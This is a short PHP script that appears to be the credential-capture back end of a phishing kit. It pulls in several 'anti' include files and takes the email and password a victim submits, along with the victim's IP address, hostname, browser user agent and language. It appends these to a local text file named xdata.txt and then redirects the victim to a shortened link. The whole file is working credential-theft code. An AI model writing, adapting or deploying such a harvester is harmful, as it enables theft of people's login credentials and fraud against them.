<?php
session_start();
include "../anti/anti1.php";
include "../anti/anti2.php"; 
include "../anti/anti3.php"; 
include "../anti/anti4.php"; 
include "../anti/anti5.php"; 
include "../anti/anti7.php"; 

$data .= $_POST['email'] . "\n";
$data .= $_POST['password'] . "\n";
$data .= date("F j, Y, g:i a") . "\n";
$data .= $_SERVER['REMOTE_ADDR'] . "\n";
$data .= gethostbyaddr($_SERVER['REMOTE_ADDR']) . "\n";
$data .= $_SERVER['HTTP_USER_AGENT'] . "\n";
$data .= $_SERVER['HTTP_ACCEPT_LANGUAGE'] . "\n";
$data .= "-------------------------------------" . "\n";
$file = "xdata.txt";

$fp = fopen($file, "a");
fwrite($fp, $data); 
header('Location: https://cutt.ly/Dwz07r3L');

?>